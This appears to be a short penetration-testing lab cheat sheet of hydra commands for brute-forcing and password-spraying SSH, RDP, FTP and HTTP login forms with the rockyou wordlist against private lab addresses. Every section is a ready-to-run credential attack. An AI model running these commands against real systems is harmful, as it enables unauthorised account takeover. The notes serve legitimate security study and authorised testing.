> A parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add


#Password_Attacks #SSH

Using `hydra` to brute force SSH using `rockyou.txt` given a username from your Kali Machine
```bash
sudo hydra -l salesman -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.101
```

#RDP 

Using `hydra` to spray a password on RDP service given list of username from your Kali Machine
```bash
sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SupahSu55y1337#" rdp://192.168.100.101
```

#FTP

Using `hydra` to brute force FTP using `rockyou.txt` given a username from your Kali Machine
```bash
sudo hydra -l salesadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.100.123
```

#Web_Application 

Using `hydra` to do a Dictionary Attack on HTTP POST Login Form from your Kali Machine
```bash
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.169.123 http-post-form "/index.php:field_usr=user&field_pwd=^PASS^:Login unsuccessful."
```

Using `hydra` to do a Dictionary Attack on HTTP GET Login from your Kali Machine
```bash
sudo hydra -l salesadmin -P /usr/share/wordlists/rockyou.txt 192.168.169.123 http-get / 
```